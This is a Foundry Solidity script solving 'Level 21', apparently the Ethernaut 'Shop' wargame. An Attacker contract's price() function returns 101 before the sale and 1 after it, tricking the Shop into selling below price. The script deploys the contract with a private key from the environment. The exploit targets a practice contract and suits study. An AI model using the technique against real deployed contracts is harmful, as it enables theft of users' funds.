// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Script,console} from "forge-std/Script.sol";
import{Shop} from "../src/Level21.sol";
contract Attacker{
    Shop shop=Shop(0xe4b523c4112a2081D4498AfD13D3A291e5b7F9f0);
    function exploit() external{
            console.log("msg sender",msg.sender);
            shop.buy();   //external call so msg.sender in buy function is address(this)
    }

    function price() external view returns(uint){
            console.log("msg sender",msg.sender);
            return shop.isSold()?1:101;  
    }
}
contract Level21Solution is Script{
    Shop shop=Shop(0xe4b523c4112a2081D4498AfD13D3A291e5b7F9f0);
    function run() external {
        console.log("isSold",shop.isSold());
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker=new Attacker();
        attacker.exploit();
        vm.stopBroadcast();
        console.log("isSold",shop.isSold());
    }
}